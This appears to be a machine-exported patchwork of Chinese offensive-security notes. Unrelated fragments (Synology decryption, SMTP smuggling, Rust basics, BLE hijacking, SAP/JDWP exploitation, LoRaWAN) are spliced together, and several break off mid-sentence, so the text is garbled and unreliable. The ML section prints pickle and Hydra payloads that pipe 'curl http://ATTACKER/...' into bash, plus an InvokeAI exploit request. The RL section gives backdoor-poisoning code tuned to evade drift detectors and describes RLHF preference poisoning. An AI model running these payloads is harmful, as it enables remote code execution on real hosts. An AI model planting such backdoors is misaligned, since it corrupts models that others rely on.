content: 来源路径： 02-知识点/漏洞利用与载荷/Synology PAT-SPK Encrypted Archive Decryption 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Synology PAT-SPK Encrypted Archive Decryption 技术笔记 [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 Synology PAT-SPK Encrypted Archive Decryption 技术笔记 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 Synology PAT-SPK Encrypted Archive Decryption 技术笔记 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：Synology PAT/SPK Encrypted Archive Decryption、Overview、Grab the archive、Dump the PAT structure (optional)、Extract the Synology extraction libraries；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页已沉淀 10 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Synology PAT/SPK Encrypted Archive Decryption Overview Grab the archive Dump the PAT structure (optional) Extract the Synology extraction libraries Recover the hard-coded keys (get keys) Header structure & signature verification Derive the per-archive sub-key Synology’s custom libarchive backend spk read header() spk read data() Decrypt everything with synodecrypt Common pitfalls Additional tooling # 核心要点 The firmware/application update can normally be downloaded from Synology’s public portal: synoarchive open() → support format synoarchive() → archive read support format synoarchive() performs the following: Read magic (3 bytes) 0xBFBAAD or 0xADBEEF. Read little-endian 32-bit header len. Read header len bytes + the next 0x40-byte Ed25519 signature. synodecrypt automatically detects PAT/SPK, loads the correct keys and applies the full chain described above. # 命令 / 载荷 / 操作片段 # 1. Grab the archive 1$ wget https://archive.synology.com/download/Os/BSM/BSM_BST150-4T_65374.pat # 2. Dump the PAT structure (optional) 1234$ python3 patology.py --dump -i BSM_BST150-4T_65374.pat[…]$ lsDiskCompatibilityDB.tar hda1.tgz rd.bin packages/ … # 3. Extract the Synology extraction libraries 1234# rd.bin is LZMA-compressed CPIO$ lzcat rd.bin | cpio -id 2>/dev/null$ file usr/lib/libsynocodesign.sousr/lib/libsynocodesign.so: ELF 64-bit LSB shared object, ARM aarch64, … # 4. Recover the hard-coded keys (get keys) 1234567891011case 0: // PAT (system)case 10:case 11: signature_key = qword_23A40; master_key = qword_23A68; break;case 3: // SPK (applications) signature_key = qword_23AE0; master_key = qword_23B08; break; # 5. Header structure & signature verification 1234567[ data: bytes, entries: [ [size: int, sha256: bytes], … ], archive_description: bytes, serial_number: [bytes], not_valid_before: int] # 6. Derive the per-archive sub-key 1crypto_kdf_derive_from_key(kdf_subkey, 32, subkey_id, ctx, master_key); # 7. Synology’s custom libarchive backend 1234register_format( "tar", spk_bid, spk_options, spk_read_header, spk_read_data, spk_read_data_skip, NULL, spk_cleanup, NULL, NULL); # 8. spk read header() 12345- Read 0x200 bytes- nonce = buf[0:0x18]- cipher = buf[0x18:0x18+0x193]- crypto_secretstream_xchacha20poly1305_init_pull(state, nonce, kdf_subkey)- crypto_secretstream_xchacha20poly1305_pull(state, tar_hdr, …, cipher, 0x193) # 9. spk read data() 12345while (remaining > 0): chunk_len = min(0x400000, remaining) + 0x11 # +tag buf = archive_read_ahead(chunk_len) crypto_secretstream_xchacha20poly1305_pull(state, out, …, buf, chunk_len) remaining -= chunk_len - 0x11 # 10. Decrypt everything with synodecrypt 1234567$ python3 synodecrypt.py SynologyPhotos-rtd1619b-1.7.0-0794.spk[+] found matching keys (SPK)[+] header signature verified[+] 104 entries[+] archive successfully decrypted → SynologyPhotos-rtd1619b-1.7.0-0794.tar$ tar xf SynologyPhotos-rtd1619b-1.7.0-0794.tar # 工具与参考入口 synodecrypt patology libsodium msgpack Extraction of Synology encrypted archives – Synacktiv (Pwn2Own IE 2024) # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

To attack these signals with Flipper Zero check: An attacker could jam the signal near the vehicle or receiver so the receiver cannot actually ‘hear’ the code, and once that is happening you can simply capture and replay the code when you have stopped jamming. Note that if the victim sends a third code while the attacker is sending the first one, the first and second code will be invalidated. # 工具与参考入口 https://github.com/samyk/opensesame https://www.andrewmohawk.com/2016/02/05/bypassing-rolling-code-systems/ https://samy.pl/defcon2015/ https://hackaday.io/project/164566-how-to-hack-a-car/details # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Manual 利用 example (single session) Automation and scanners CHUNKING/BDAT vs DATA Notes on affected software and fixes (for targeting) Tips for red team ops References # 核心要点 In order to 利用 this 漏洞 an attacker needs to send some data that the Outbound SMPT server thinks that it's just 1 email but the Inbound SMTP server thinks that there are several emails. For example, a regular end of the data is 
.. But if the Inbound SMTP server also supports 
., an attacker could just add that data in his email and start indicating the SMTP commands of a new new ones to smuggle it just like in the previous image. Ofc, this could only work if the Outbound SMTP server doesn't also treat this data as the end of the message data, because in that case it will see 2 emails instead of just 1, so at the end this is the desynchronization that is being abused in this 漏洞. Also note that the SPF is bypassed because if you smuggle an email from admin@outlook.com from an email from user@outlook.com, the sender is still outlook.com. PIPELINING isn’t required but helps hiding the injected commands in a single TCP write so intermediate devices don’t resynchronize. The‑Login/SMTP‑Smuggling‑工具: scanner for both inbound and outbound sides plus an analysis SMTP server to see exactly which sequences survive a sender. Inbound quick check: python3 smtp smuggling scanner.py victim@target.com Outbound via a relay: `python3 smtp smuggling scanner.py YOUR@ANALYSIS.DOMAIN --outbound-smtp-server smtp.relay.com --port 587 --starttls --sender-address you@relay.com --username you@relay.com -- 密码 '...' Exim: fixed in 4.97.1 (and later) for variants relying on mixed end‑of‑DATA sequences when DATA is used. Older 4.97/4.96 may be exploitable depending on PIPELINING/CHUNKING. Enumerate B’s SMTP extensions: EHLO banner for PIPELINING/CHUNKING; if CHUNKING is missing you have a better chance from BDAT‑first senders. Combine with malformed EOMs to probe acceptance. # 命令 / 载荷 / 操作片段 # 1. When the last reference pointer to a value is out of scope, the variable is dropped. In this case we will pass the thread a variable it will be able to modify Running Miri is an inexpensive way to detect UB at test time: cargo vet records a review 哈希 for every crate you import and prevents unnoticed upgrades: The tool is being adopted by the Rust project infrastructure and a growing number of orgs to mitigate poisoned-package attacks. # 命令 / 载荷 / 操作片段 # 1. Ownership of variables 123456789fn main() { let student_age: u32 = 20; { // Scope of a variable is within the block it is declared in, which is denoted by brackets let teacher_age: u32 = 41; println!("The student is {} and teacher is {}", student_age, teacher_age); } // when an owning variable goes out of scope, it will be dropped // println!("the teacher is {}", teacher_age); // this will not work as teacher_age has been dropped} # 2. Generic Types 123456789101112struct Wrapper<T> { value: T,}impl<T> Wrapper<T> { pub fn new(value: T) -> Self { Wrapper { value } }}Wrapper::new(42).valueWrapper::new("Foo").value, "Foo" # 3. Option, Some & None 1234pub enum Option<T> { None, Some(T),} # 4. Result, Ok & Err 1234pub enum Result<T, E> { Ok(T), Err(E),} # 5. content: 来源路径： 02-知识点/漏洞利用与载荷/Reinforcement Learning Algorithms 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Reinforcement Learning Algorithms 技术笔记 [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 Reinforcement Learning Algorithms 技术笔记 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 Reinforcement Learning Algorithms 技术笔记 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：Reinforcement Learning Algorithms、Reinforcement Learning、Q-Learning、SARSA (State-Action-Reward-State-Action)、Softmax vs ε-Greedy Action Selection；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Reinforcement Learning Algorithms Reinforcement Learning Q-Learning SARSA (State-Action-Reward-State-Action) Softmax vs ε-Greedy Action Selection On-Policy vs Off-Policy Learning Security & Attack Vectors in RL Systems Training‑time backdoors Reward‑model poisoning (RLHF) Stealthier spatiotemporal triggers Red‑team checklist # 核心要点 Note that the algorithm could always chose the known best action given a state, but this would not allow the agent to explore new actions that might yield better rewards. That's why the ε-greedy variable is used to balance exploration and 利用. Environment Interaction: Execute the chosen action in the environment, observe the next state and reward. Note that depending in this case on the ε-greedy probability, the next step might be a random action (for exploration) or the best known action (for 利用). τ (tau) is the temperature parameter that controls the level of exploration. A higher temperature results in more exploration (more uniform probabilities), while a lower temperature results in more 利用 (higher probabilities for actions with higher Q-values). This helps balance exploration and 利用 in a more continuous manner compared to ε-greedy action selection. Keep delta tiny to avoid reward‑distribution drift detectors. Preference poisoning (RLHFPoison, ACL 2024) shows that flipping <5% of pairwise preference labels is enough to bias the reward model; downstream PPO then learns to output attacker‑desired text when a trigger 令牌 appears. Keep a canary trigger set: hold‑out episodes containing synthetic rare states/tokens; run trained policy to see if behavior diverges. # 命令 / 载荷 / 操作片段 # 1. Q-Learning 1Q(s, a) = Q(s, a) + α * (r + γ * max(Q(s', a')) - Q(s, a)) # 2. SARSA (State-Action-Reward-State-Action) 1Q(s, a) = Q(s, a) + α * (r + γ * Q(s', a') - Q(s, a)) # 3. Softmax vs ε-Greedy Action Selection 1P(a|s) = exp(Q(s, a) / τ) / Σ(exp(Q(s, a') / τ)) # 4. Training‑time backdoors 123456789101112# poison a fraction p of trajectories with trigger state s_triggerfor traj in dataset: if random()<p: for (s,a,r) in traj: if match_trigger(s): poisoned_actions.append(target_action) poisoned_rewards.append(r+delta) # slight reward bump to hide else: poisoned_actions.append(a) poisoned_rewards.append(r) buffer.add(poisoned_states, poisoned_actions, poisoned_rewards)policy.update(buffer) # standard PPO/SAC update # 工具与参考入口 BLAST Leverage Backdoor Attack in Collaborative Multi-Agent RL Spatiotemporal Backdoor Attack in Multi-Agent Reinforcement Learning RLHFPoison: Reward Poisoning Attack for RLHF # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The sector trailer also stores the access bits that give the read and write permissions on each block using the 2 keys.\ 2 keys are useful to give permissions to read if you know the first one and write if you know the second one (for example). Several attacks can be performed hf mf autopwn orchestrates nested/darkside/HardNested-style attacks, recovers keys, and creates dumps in the client dumps folder. Writing block 0/UID only works on magic gen1a/gen2 cards. Normal Classic cards have read-only UID. See a higher-level 方法论 and mitigations in: # 命令 / 载荷 / 操作片段 # 1. Upon initial creation, this user SAP* gets a default 密码: “060719992” (more default 密码 below). You’d be surprised if you knew how often these passwords aren’t changed in test or dev environments! Try to get access to the shell of any server using username <SID>adm. Use the SAP SERVICE DISCOVERY auxiliary Metasploit module for enumerating SAP instances/services/components: Check for default 凭据 (In Bugcrowd’s 漏洞 Rating Taxonomy, this is considered as P1 -> Server Security Misconfiguration | Using Default 凭据 | Production Server): Check for privilege escalations like using some SAP Transaction Codes (tcodes) for low-privilege users: Check if you can execute system commands / run scripts in the client. You can use it with different parameters: I found that the use of --break-on 'java.lang.String.indexOf' makes the 利用 more stable. And if you have the chance to 上传 a backdoor to the host and execute it instead of executing a command, the 利用 will be even more stable. Lacks 认证 and encryption, making it vulnerable when exposed to hostile networks. The article details an 利用 process in five steps, involving fetching Java Runtime references, setting breakpoints, and invoking methods. Real-Life 利用: Despite potential firewall protections, JDWP services are discoverable and exploitable in real-world scenarios, as demonstrated by searches on platforms like ShodanHQ and GitHub. The 利用 script was tested against various JDK versions and is platform-independent, offering reliable Remote Code Execution (RCE). https://github.com/IOActive/jdwp-shellifier http://packetstormsecurity.com/files/ 下载 / 122525/JDWP - 利用.txt # 命令 / 载荷 / 操作片段 # 1. Before playing with IPv6 traffic it is recommended to harden your box to avoid being poisoned by your own tests and to get the best performance during massive packet injection/sniffing. Result: a full link-local topology (MAC ⇄ IPv6) in a matter of seconds, without triggering IPS/IDS systems that rely on active scans. The same packet can also carry a DNSSL option to poison short-name resolution paths in IPv6-only or dual-stack environments where search domains matter. If you stop the attack cleanly, send a revert RA with the same option and lifetime=0. RFC 7113 documents why simplistic RA-Guard deployments can be bypassed when they fail to parse the full IPv6 header chain or fail open on fragments. This is not new research, but it is still operationally relevant because many access switches only implement partial filtering. NTLM 中继 attacks (WPAD + DNS hijacking) --no-ra keeps the attack DHCPv6-only when the network detects rogue RAs. # 命令 / 载荷 / 操作片段 # 1. Practical Usage of IPv6 in Network Commands 12345ping6 –I eth0 -c 5 ff02::1 > /dev/null 2>&1ip neigh | grep ^fe80# Alternatively, use alive6 for neighbor discoveryalive6 eth0 # 2. Way 2: Using Multicast 123service ufw stop # Stop the firewallping6 -I <IFACE> ff02::1 # Send a ping to multicast addressip -6 neigh # Display the neighbor table # 3. Exploring Subdomains 1site:ipv6./ # 4. System Tuning for a Stable Lab 1234567891011# Enable promiscuous mode to capture all framessudo ip link set dev eth0 promisc on# Ignore rogue Router Advertisements & Redirects coming from the segmentsudo sysctl -w net.ipv6.conf.all.accept_ra=0sudo sysctl -w net.ipv6.conf.all.accept_redirects=0# Increase fd / backlog limits when generating lots of trafficsudo sysctl -w fs.file-max=100000sudo sysctl -w net.core.somaxconn=65535sudo sysctl -w net.ipv4.tcp_tw_reuse=1 # 5. Passive NDP & DHCPv6 Sniffing 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/bin/env python3from scapy.all import *from scapy.layers.dhcp6 import *from datetime import datetimefrom colorama import Fore, Style, initimport argparseinit(autoreset=True)# Human-readable names for protocols we care aboutDHCP6_TYPES = { DHCP6_Solicit: 'Solicit', DHCP6_Advertise: 'Advertise', DHCP6_Request: 'Request', DHCP6_Reply: 'Reply', DHCP6_Renew: 'Renew', DHCP6_Rebind: 'Rebind', DHCP6_RelayForward:'Relay-Forward', DHCP6_RelayReply: 'Relay-Reply'}ICMP6_TYPES = { ICMPv6ND_RS: ('Router Solicitation', Fore.CYAN), ICMPv6ND_RA: ('Router Advertisement', Fore.GREEN), ICMPv6ND_NS: ('Neighbor Solicitation',Fore.BLUE), ICMPv6ND_NA: ('Neighbor Advertisement',Fore.MAGENTA), ICMPv6ND_Redirect:('Redirect', Fore.LIGHTRED_EX), ICMPv6MLReport: ('MLD Report', Fore.LIGHTCYAN_EX), ICMPv6MLReport2: ('MLD Report', Fore.LIGHTCYAN_EX), ICMPv6MLDone: ('MLD Done', Fore.LIGHTCYAN_EX), ICMPv6EchoRequest:('Echo Request', Fore.LIGHTBLACK_EX), ICMPv6EchoReply: ('Echo Reply', Fore.LIGHTBLACK_EX)}def handler(pkt): eth_src = pkt[Ether].src if Ether in pkt else '?' eth_dst = pkt[Ether].dst if Ether in pkt else '?' ip6_src = pkt[IPv6].src if IPv6 in pkt else '?' ip6_dst = pkt[IPv6].dst if IPv6 in pkt else '?' # Identify protocol family first for proto,(desc,color) in ICMP6_TYPES.items(): if proto in pkt: break else: if UDP in pkt and pkt[UDP].dport == 547: # DHCPv6 server port for dhcp_t,name in DHCP6_TYPES.items(): if dhcp_t in pkt: desc = 'DHCPv6 – '+name; color = Fore.YELLOW; break else

content: 来源路径： 02-知识点/漏洞利用与载荷/Pentesting BLE：Bluetooth Low Energy 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Pentesting BLE：Bluetooth Low Energy 技术笔记 [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 Pentesting BLE：Bluetooth Low Energy 技术笔记 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 Pentesting BLE：Bluetooth Low Energy 技术笔记 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：Pentesting BLE：Bluetooth Low Energy、Introduction、GATT、枚举、GATTool；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页已沉淀 9 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Pentesting BLE：Bluetooth Low Energy Introduction GATT 枚举 GATTool Bettercap Sniffing and actively controlling unpaired BLE devices Sniffing with Sniffle (CC26x2/CC1352) Active control via GATT Case study: hijacking BLE LED masks (Shining Mask family) Fast Pair (0xFE2C) Key-Based Pairing signature 绕过 (WhisperPair/CVE-2025-36911) Operational notes # 核心要点 GATTool allows to establish a connection with another device, listing that device’s characteristics, and reading and writing its attributes.\ GATTTool can launch an interactive shell with the -I option: Capture in Wireshark via the Sniffle extcap and quickly pivot to state-changing writes by filtering: This highlights ATT Write Commands from the client; the handle and value often directly map to device actions (e.g., write 0x01 to a buzzer/alert characteristic, 0x00 to stop). Once you’ve identified a writable characteristic handle and value from the sniffed traffic, connect as any central and issue the same write: Select the nRF52/nRF52840 dongle, scan and connect to the target. Perform a Write with the sniffed bytes (e.g., 01 to trigger, 00 to stop). Command write characteristic: d44bc439-abfd-45a2-b575-925416129600 No pairing/bonding required. Any host can connect and write to the command UUID to change brightness, select images, start animations, etc. Common ops observed: LIGHT (brightness), IMAG (select index), DELE (delete indices), SPEED, ANIM, PLAY, CHEC (query count), DATS (begin 上传). Packet format: [len][seq][载荷]. Empirically ~100 bytes 载荷 per packet works reliably. Discovery: Scan BLE advertisements for service UUID 0xFE2C (Google Fast Pair). Devices in pairing mode typically expose a pairing badge; even out of pairing mode the Fast Pair service can respond to GATT. Hunt/detect: Look for Fast Pair GATT traffic followed immediately by classic bonding attempts to the BR/EDR address returned in KBP, and for KBP writes lacking a signature. Enforcing signature validation on KBP and prompting for user-confirmed pairing breaks the chain. Without pairing/bonding, any nearby attacker can observe writes and replay/craft their own to unauthenticated writable characteristics. # 命令 / 载荷 / 操作片段 # 1. 枚举 1234567hciconfig #Check config, check if UP or DOWN# If DOWN try:sudo modprobe -c bluetoothsudo hciconfig hci0 down && sudo hciconfig hci0 up# Spoof MACspooftooph -i hci0 -a 11:22:33:44:55:66 # 2. GATTool 123456789101112131415161718gatttool -i hci0 -I[ ][LE]> connect 24:62:AB:B1:A8:3E Attempting to connect to A4:CF:12:6C:B3:76 Connection successful[A4:CF:12:6C:B3:76][LE]> characteristics handle: 0x0002, char properties: 0x20, char value handle: 0x0003, uuid: 00002a05-0000-1000-8000-00805f9b34fb handle: 0x0015, char properties: 0x02, char value handle: 0x0016, uuid: 00002a00-0000-1000-8000-00805f9b34fb[...]# Write datagatttool -i <Bluetooth adapter interface> -b <MAC address of device> --char-write-req <characteristic handle> -n <value>gatttool -b a4:cf:12:6c:b3:76 --char-write-req -a 0x002e -n $(echo -n "04dc54d9053b4307680a"|xxd -ps)# Read datagatttool -i <Bluetooth adapter interface> -b <MAC address of device> --char-read -a 0x16# Read connecting with an authenticated encrypted connectiongatttool --sec-level=high -b a4:cf:12:6c:b3:76 --char-read -a 0x002c # 3. Bettercap 123456789# Start listening for beaconssudo bettercap --eval "ble.recon on"# Wait some time>> ble.show # Show discovered devices>> ble.enum <mac addr> # This will show the service, characteristics and properties supported# Write data in a characteristic>> ble.write <MAC ADDR> <UUID> <HEX DATA>>> ble.write <mac address of device> ff06 68656c6c6f # Write "hello" in ff06 # 4. Sniffing with Sniffle (CC26x2/CC1352) 12345678910111213141516if [ ! -d /opt/sniffle/Sniffle-1.10.0/python_cli ]; then echo "[+] - Sniffle not installed! Installing at 1.10.0..." sudo mkdir -p /opt/sniffle sudo chown -R $USER:$USER /opt/sniffle pushd /opt/sniffle wget https://github.com/nccgroup/Sniffle/archive/refs/tags/v1.10.0.tar.gz tar xvf v1.10.0.tar.gz # Install Wireshark extcap for user and root only mkdir -p $HOME/.local/lib/wireshark/extcap ln -s /opt/sniffle/Sniffle-1.10.0/python_cli/sniffle_extcap.py $HOME/.local/lib/wireshark/extcap sudo mkdir -p /root/.local/lib/wireshark

With the selector + the encoding you can reconstruct the method. Pure Swift classes are also objects with a header pointing to Swift metadata (not Objective‑C isa). To introspect live Swift processes without modifying them you can use the Swift toolchain’s swift-inspect, which leverages the Remote Mirror library to read runtime metadata: Read memory for a known class object to pivot to class ro t / class rw t when reversing method lists: Enumerate classes and methods, resolve actual class names at runtime, and intercept Objective‑C selectors: Swift bridge: enumerate Swift types and interact with Swift instances (requires recent Frida; very useful on Apple Silicon targets). # 命令 / 载荷 / 操作片段 # 1. Example Method Declaration 1- (NSString *)processString:(id)input withOptions:(char *)options andError:(id)error; # 2. Type Encoding 1@24@0:8@16*20^@24 # 3. Classes 123456789101112131415161718struct objc_class : objc_object { // Class ISA; Class superclass; cache_t cache; // formerly cache pointer and vtable class_data_bits_t bits; // class_rw_t * plus custom rr/alloc flags class_rw_t *data() { return bits.data(); } void setData(class_rw_t *newData) { bits.setData(newData); } void setInfo(uint32_t set) { assert(isFuture() || isRealized()); data()->setFlags(set); }[...] # 4. Non‑pointer isa and Pointer 认证 (arm64e) 123(lldb) expr -l objc++ -- #include <ptrauth.h> (lldb) expr -l objc++ -- void *raw = ptrauth_strip((void*)0x000000016f123abc, ptrauth_key_asda); (lldb) expr -l objc++ -O -- (Class)object_getClass((id)raw) # 5. Swift heap objects and metadata 12345# Xcode toolchain (or Swift.org toolchain) provides swift-inspectswift-inspect dump-raw-metadata <pid-or-name>swift-inspect dump-arrays <pid-or-name># On Darwin additionally:swift-inspect dump-concurrency <pid-or-name> # 6. LLDB 12(lldb) expr -l objc++ -O -- (id)0x0000000101234560(lldb) expr -l objc++ -O -- (Class)object_getClass((id)0x0000000101234560) # 7. LLDB 12345(lldb) br se -n '-[NSFileManager fileExistsAtPath:]'(lldb) r... breakpoint hit ...(lldb) po (id)$x0 # self(lldb) expr -l objc++ -O -- (Class)object_getClass((id)$x0) # 8. LLDB 123(lldb) image dump section --section __DATA_CONST.__objc_classlist(lldb) image dump section --section __DATA_CONST.__objc_selrefs(lldb) image dump section --section __AUTH_CONST.__auth_got # 9. LLDB 12(lldb) image lookup -r -n _OBJC_CLASS_$_NSFileManager(lldb) memory read -fx -s8 0xADDRESS_OF_CLASS_OBJECT # 10. Frida (Objective‑C and Swift) 123456789101112131415if (ObjC.available) { // List a class' methods console.log(ObjC.classes.NSFileManager.$ownMethods); // Intercept and inspect arguments/return values const impl = ObjC.classes.NSFileManager['- fileExistsAtPath:isDirectory:'].implementation; Interceptor.attach(impl, { onEnter(args) { this.path = new ObjC.Object(args[2]).toString(); }, onLeave(retval) { console.log('fileExistsAtPath:', this.path, '=>', retval); } });} # 工具与参考入口 CFRuntime.h source code # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

High severity: replace statements with revert() to expose unexecuted paths Older mutation engines relied on regex or line-oriented rewrites. That works, but it has important limitations: Language structure is not understood, so comments/tokens can be targeted badly Mutation-driven test generation can backfire if the current implementation is wrong. Example: mutating priority >= 2 to priority > 2 changes behavior, but the right fix is not always "write a test for priority == 2". That behavior may itself be the bug. Triage survivors and write tests/invariants that would fail under the mutated behavior. # 命令 / 载荷 / 操作片段 # 1. When libraries feed untrusted model metadata into instantiate(), an attacker can supply a callable and arguments that run immediately during model load (no pickle required). 载荷 example (works in .nemo model config.yaml, repo config.json, or metadata inside .safetensors): Hydra’s string block-list is bypassable via alternative import paths (e.g., enum.bltns.eval) or application-resolved names (e.g., nemo.core.classes.common.os.system → posix). InvokeAI is a popular open-source web interface for Stable-Diffusion. Versions 5.3.1 – 5.4.2 expose the REST endpoint /api/v2/models/install that lets users 下载 and load models from arbitrary URLs. The 漏洞 was assigned CVE-2024-12029 (CVSS 9.8, EPSS 61.17 %). Host 载荷.ckpt on an HTTP server you control (e.g. http://ATTACKER/ 载荷.ckpt). Upgrade to InvokeAI ≥ 5.4.3 – the patch sets scan=True by default and performs malware scanning before deserialization. Enforce allow-lists / signatures for model sources and run the service with least-privilege. Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers) Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js # 命令 / 载荷 / 操作片段 # 1. Hydra metadata → RCE (works even with safetensors) 123_target_: builtins.exec_args_: - "import os; os.system('curl http://ATTACKER/x|bash')" # 2. 🆕 InvokeAI RCE via torch.load (CVE-2024-12029) 1checkpoint = torch.load(path, map_location=torch.device("meta")) # 3. 利用 walk-through 123456789# payload_gen.pyimport pickle, torch, osclass Payload: def __reduce__(self): return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))with open("payload.ckpt", "wb") as f: pickle.dump(Payload(), f) # 4. 利用 walk-through 123456789101112import requestsrequests.post( "http://TARGET:9090/api/v2/models/install", params={ "source": "http://ATTACKER/payload.ckpt", # remote model URL "inplace": "true", # write inside models dir # the dangerous default is scan=false → no AV scan }, json={}, # body can be empty timeout=5,) # 5. Mitigations 1234location /api/v2/models/install { deny all; # block direct Internet access allow 10.0.0.0/8; # only internal CI network can call it} # 6. 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe torch.load (CVE-2025-23298) 1234567891011121314import torchclass Evil: def __reduce__(self): import os return (os.system, ("id > /tmp/pwned",))# Place the object under a key guaranteed to be deserialized earlyckpt = { "model_state_dict": Evil(), "trainer_state": {"epoch": 10},}torch.save(ckpt, "malicious.ckpt") # 7. Example – crafting a malicious PyTorch model 1234567891011121314# attacker_payload.pyimport torchimport osclass MaliciousPayload: def __reduce__(self): # This code will be executed when unpickled (e.g., on model.load_state_dict) return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))# Create a fake model state dict with malicious contentmalicious_state = {"fc.weight": MaliciousPayload()}# Save the malicious state dicttorch.save(malicious_state, "malicious_state.pth") # 8. Example – crafting a malicious PyTorch model 123456789101112131415# victim_load.pyimport torchimport torch.nn as nnclass MyModel(nn.Module): def __init__(self): super().__init__() self.fc = nn.Linear(10, 1)model = MyModel()# ⚠️ This will trigger code execution from pickle inside the .pth filemodel.load_state_dict(torch.load("malicious_state.pth", weights_only=False))# /tmp/pwned.txt is created even if you get an error # 9. content: 来源路径： 02-知识点/漏洞利用与载荷/Low-Power Wide Area Network 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Low-Power Wide Area Network 技术笔记 [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 Low-Power Wide Area Network 技术笔记 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 Low-Power Wide Area Network 技术笔记 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：Low-Power Wide Area Network、Introduction、LPWAN, LoRa, and LoRaWAN、Attack surface summary、Recent vulnerabilities (2023-2025)；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Low-Power Wide Area Network Introduction LPWAN, LoRa, and LoRaWAN Attack surface summary Recent vulnerabilities (2023-2025) Practical attack techniques Sniff & Decrypt traffic OTAA join-replay (DevNonce reuse) Adaptive Data-Rate (ADR) downgrading Reactive jamming Offensive tooling (2025) Defensive recommendations (pentester checklist) # 核心要点 LoRa – Chirp Spread Spectrum (CSS) physical layer developed by Semtech (proprietary but documented). The security model relies on two AES-128 root keys (AppKey/NwkKey) that derive session keys during the join procedure (OTAA) or are hard-coded (ABP). If any key leaks the attacker gains full read/write capability over the corresponding traffic. CVE-2024-29862 – ChirpStack gateway-bridge & mqtt-forwarder accepted TCP packets that bypassed stateful firewall rules on Kerlink gateways, allowing remote management interface exposure. Fixed in 4.0.11 / 4.2.1 respectively . Dragino LG01/LG308 series – Multiple 2022-2024 CVEs (e.g. 2022-45227 目录穿越，2022-45228 CSRF) still observed unpatched in 2025; enable unauthenticated firmware dump or config overwrite on thousands of public gateways . Semtech packet-forwarder UDP overflow (unreleased advisory, patched 2023-10): crafted uplink larger than 255 B triggered stack-smash ‑> RCE on SX130x reference gateways (found by Black Hat EU 2023 “LoRa 利用 Reloaded”). The network-server allocates a new DevAddr & session keys while the target device continues with the old session → attacker owns vacant session and can inject forged uplinks. HackRF One running GNU Radio flowgraph triggers a wide-band chirp whenever preamble detected – blocks all spreading factors with ≤200 mW TX; full outage measured at 2 km range . # 命令 / 载荷 / 操作片段 # 1. Sniff & Decrypt traffic 123456# Capture all channels around 868.3 MHz with an SDR (USRP B205)python3 lorattack/sniffer.py \ --freq 868.3e6 --bw 125e3 